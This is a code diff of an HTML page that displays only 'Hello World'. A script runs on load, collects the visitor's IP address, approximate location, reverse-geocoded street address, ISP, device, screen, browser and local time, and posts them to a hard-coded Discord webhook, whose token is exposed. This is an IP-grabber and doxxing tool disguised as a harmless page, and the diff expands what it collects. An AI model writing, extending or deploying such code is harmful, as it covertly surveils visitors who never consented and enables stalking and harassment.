@@ -1,61 +1,106 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Hello World</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      background: #f5f5f5;
-    }
-    h1 {
-      font-size: 4rem;
-      color: #333;
-    }
+    body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+    h1 { font-size: 4rem; color: #333; }
+    #status { margin-top: 20px; color: #555; }
   </style>
 </head>
 <body>
   <h1>Hello World</h1>
+  <div id="status">Mengambil data lokasi...</div>
 
   <script>
     (async function() {
+      const statusEl = document.getElementById('status');
+
+      // Fungsi untuk reverse geocoding pakai Google Maps (butuh API Key)
+      async function getAddressFromCoords(lat, lng) {
+        // Ganti dengan API Key Anda
+        const API_KEY = 'YOUR_GOOGLE_MAPS_API_KEY';
+        const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${API_KEY}&language=id`;
+        try {
+          const res = await fetch(url);
+          const data = await res.json();
+          if (data.status === 'OK' && data.results.length > 0) {
+            return data.results[0].formatted_address; // alamat lengkap
+          }
+        } catch (e) {}
+        return null;
+      }
+
       try {
-        // 1. Ambil data IP dan lokasi dari ipinfo.io
-        const res = await fetch('https://ipinfo.io/json');
-        const data = await res.json();
+        // 1. Dapatkan IP & lokasi perkiraan dari ip-api.com
+        const ipRes = await fetch('http://ip-api.com/json/');
+        const ipData = await ipRes.json();
+        if (ipData.status !== 'success') throw new Error('Gagal deteksi IP');
 
-        const ip = data.ip || 'Tidak diketahui';
+        const ip = ipData.query;
+        const lat = ipData.lat;
+        const lon = ipData.lon;
+        const isp = ipData.isp || 'Tidak diketahui';
+        const timezone = ipData.timezone || 'Tidak diketahui';
 
-        // Susun lokasi (kota, provinsi, negara)
-        let location = '';
-        if (data.city) location += data.city;
-        if (data.region) location += (location ? ', ' : '') + data.region;
-        if (data.country) location += (location ? ', ' : '') + data.country;
-        if (!location) location = 'Tidak diketahui';
-
-        // Link Google Maps dari koordinat
-        let mapLink = 'Tidak tersedia';
-        if (data.loc) {
-          const [lat, lng] = data.loc.split(',');
-          mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+        // 2. Coba reverse geocoding dengan koordinat dari IP (mendapatkan alamat lengkap)
+        let fullAddress = null;
+        if (lat && lon) {
+          fullAddress = await getAddressFromCoords(lat, lon);
         }
 
-        // 2. Bentuk embed sesuai struktur yang diminta
+        // 3. Jika gagal, susun dari data ip-api
+        let location = fullAddress || 
+          [ipData.district, ipData.city, ipData.regionName, ipData.country]
+          .filter(Boolean).join(', ') || 'Tidak diketahui';
+
+        // 4. Link Maps
+        let mapLink = 'Tidak tersedia';
+        if (lat && lon) {
+          mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        }
+
+        // 5. Info device & browser
+        const ua = navigator.userAgent;
+        let device = 'Tidak diketahui';
+        if (/android/i.test(ua)) device = 'Android';
+        else if (/iphone|ipad/i.test(ua)) device = 'iOS';
+        else if (/windows/i.test(ua)) device = 'Windows';
+        else if (/mac/i.test(ua)) device = 'macOS';
+        else if (/linux/i.test(ua)) device = 'Linux';
+        device += ` | ${window.screen.width}x${window.screen.height} | ${navigator.hardwareConcurrency || '?'} cores`;
+
+        let browser = 'Tidak diketahui';
+        if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
+        else if (/firefox/i.test(ua)) browser = 'Firefox';
+        else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
+        else if (/edge/i.test(ua)) browser = 'Edge';
+        const vMatch = ua.match(/(?:Chrome|Firefox|Safari|Edge)\/(\d+)/);
+        if (vMatch) browser += `/${vMatch[1]}`;
+
+        // 6. Waktu
+        const now = new Date();
+        const timeStr = now.toLocaleString('id-ID', { timeZone: timezone || 'Asia/Jakarta' });
+
+        // 7. Kirim ke Discord
         const embed = {
-          title: '📡 Data Pengunjung Baru',
-          color: 0x5865F2, // biru Discord
+          title: '📍 Data Pengunjung (GPS + Reverse Geocode)',
+          color: 0x00FF00,
           fields: [
-            { name: 'IP ADDRES', value: ip, inline: false },
-            { name: 'LOCATION', value: location, inline: false },
-            { name: 'LINK MAPS', value: mapLink, inline: false }
+            { name: 'IP ADDRESS', value: ip, inline: false },
+            { name: 'LOCATION (Desa/Kelurahan)', value: location, inline: false },
+            { name: 'LINK MAPS', value: mapLink, inline: false },
+            { name: 'ISP', value: isp, inline: false },
+            { name: 'DEVICE', value: device, inline: false },
+            { name: 'BROWSER', value: browser, inline: false },
+            { name: 'TIMEZONE', value: timezone, inline: false },
+            { name: 'WAKTU', value: timeStr, inline: false }
           ],
-          timestamp: new Date().toISOString()
+          timestamp: now.toISOString()
         };
 
-        // 3. Kirim ke webhook Discord
         const webhookURL = 'https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB';
         await fetch(webhookURL, {
           method: 'POST',
@@ -63,11 +108,14 @@
           body: JSON.stringify({ embeds: [embed] })
         });
 
-        console.log('✅ Berhasil dikirim ke Discord');
-      } catch (error) {
-        console.error('❌ Gagal mengirim:', error);
+        statusEl.textContent = '✅ Data berhasil dikirim!';
+        statusEl.style.color = 'green';
+      } catch (err) {
+        statusEl.textContent = '❌ Gagal: ' + err.message;
+        statusEl.style.color = 'red';
+        console.error(err);
       }
     })();
   </script>
 </body>
-</html>
+  </html>
